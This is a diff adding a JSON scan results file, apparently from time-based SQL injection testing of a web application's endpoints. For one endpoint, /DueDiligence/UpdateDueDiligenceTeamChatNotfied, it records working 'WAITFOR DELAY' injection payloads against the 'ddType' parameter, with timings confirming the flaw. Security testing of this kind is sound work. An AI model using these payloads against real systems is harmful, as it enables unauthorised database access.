@@ -1,0 +1,83 @@
+[
+  {
+    "endpoint": "/CustomerProviderDocument/GetDDDocumentList",
+    "controller": "CustomerProviderDocument",
+    "action": "GetDDDocumentList",
+    "http_method": "POST",
+    "baseline_time": 2.63,
+    "timestamp": "2025-12-22T12:53:27.105539",
+    "skipped": false,
+    "vulnerabilities": []
+  },
+  {
+    "endpoint": "/DueDiligence/UpdateDueDiligenceTeamChatNotfied",
+    "controller": "DueDiligence",
+    "action": "UpdateDueDiligenceTeamChatNotfied",
+    "http_method": "POST",
+    "baseline_time": 0.93,
+    "timestamp": "2025-12-22T12:53:41.208048",
+    "skipped": false,
+    "vulnerabilities": [
+      {
+        "parameter": "ddType",
+        "payload": "';WAITFOR DELAY '0:0:10'--",
+        "response_time": 12.43,
+        "baseline_time": 0.93,
+        "time_difference": 11.5,
+        "expected_delay": 10.0,
+        "status_code": 500,
+        "vulnerable": true
+      },
+      {
+        "parameter": "ddType",
+        "payload": "';WAITFOR DELAY '0:0:15'--",
+        "response_time": 17.43,
+        "baseline_time": 0.93,
+        "time_difference": 16.5,
+        "expected_delay": 15.0,
+        "status_code": 500,
+        "vulnerable": true
+      },
+      {
+        "parameter": "ddType",
+        "payload": "1';WAITFOR DELAY '0:0:10'--",
+        "response_time": 12.42,
+        "baseline_time": 0.93,
+        "time_difference": 11.49,
+        "expected_delay": 10.0,
+        "status_code": 500,
+        "vulnerable": true
+      },
+      {
+        "parameter": "ddType",
+        "payload": "admin';WAITFOR DELAY '0:0:10'--",
+        "response_time": 12.39,
+        "baseline_time": 0.93,
+        "time_difference": 11.46,
+        "expected_delay": 10.0,
+        "status_code": 500,
+        "vulnerable": true
+      }
+    ]
+  },
+  {
+    "endpoint": "/Company/GetCompaniesList",
+    "controller": "Company",
+    "action": "GetCompaniesList",
+    "http_method": "POST",
+    "baseline_time": 2.44,
+    "timestamp": "2025-12-22T12:54:43.197951",
+    "skipped": false,
+    "vulnerabilities": []
+  },
+  {
+    "endpoint": "/Company/GetImportedSPList",
+    "controller": "Company",
+    "action": "GetImportedSPList",
+    "http_method": "GET",
+    "baseline_time": 11.64,
+    "timestamp": "2025-12-22T12:55:18.855255",
+    "skipped": false,
+    "vulnerabilities": []
+  }
+]
